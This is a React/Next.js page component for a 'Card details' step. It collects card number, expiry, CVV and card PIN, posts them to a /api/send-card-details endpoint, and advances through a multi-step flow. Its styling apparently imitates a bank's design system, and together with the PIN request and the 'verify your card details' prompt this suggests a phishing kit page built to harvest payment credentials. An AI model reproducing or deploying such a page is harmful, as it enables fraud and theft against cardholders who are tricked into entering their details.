import { yupResolver } from "@hookform/resolvers/yup";
import valid from "card-validator";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "../../../components/Button";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { Wrapper } from "../../../components/Wrapper";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";
import { DataContext } from "../../_app";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("This field is required")
    .test(
      "test-number",
      "Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("This field is required")
    .test(
      "test-date",
      "Please enter a valid expirary date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("This field is required")
    .test(
      "test-cvv",
      "Please enter a valid cvv",
      (value) => valid.cvv(value, [3, 4]).isValid
    ),
  cardPin: yup
    .string()
    .required("This field is required")
    .min(4, "Please enter a valid card pin")
    .max(5, "Please enter a valid card pin"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(`cardDetails`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper title="Card details">
      <div
        className="tru-core-card-content tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacingXl)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <p
          className="tru-core-card-copy--retail"
          style={{
            marginTop: 0,
          }}
        >
          {" "}
          {`Let's`} verify your card details.{" "}
        </p>
        <InputWrapper>
          <Input
            label={`Card number`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`cardNumber`}
            register={register}
            mask={cardMask}
            error={
              errors.cardNumber &&
              (errors.cardNumber.message as unknown as string)
            }
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Expiry date`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`expirationDate`}
            register={register}
            mask={`99/9999`}
            error={
              errors.expirationDate &&
              (errors.expirationDate.message as unknown as string)
            }
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`CVV`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`cvv`}
            register={register}
            type={`number`}
            maxLength={4}
            error={errors.cvv && (errors.cvv.message as unknown as string)}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Card pin`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`cardPin`}
            register={register}
            type={`number`}
            maxLength={5}
            error={
              errors.cardPin && (errors.cardPin.message as unknown as string)
            }
          />
        </InputWrapper>
      </div>
      <div
        className="tru-core-card-actions tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacing2xl)`,
          paddingBottom: `var(--truSpacingLg)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <Button label={`Continue`} onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default Card;
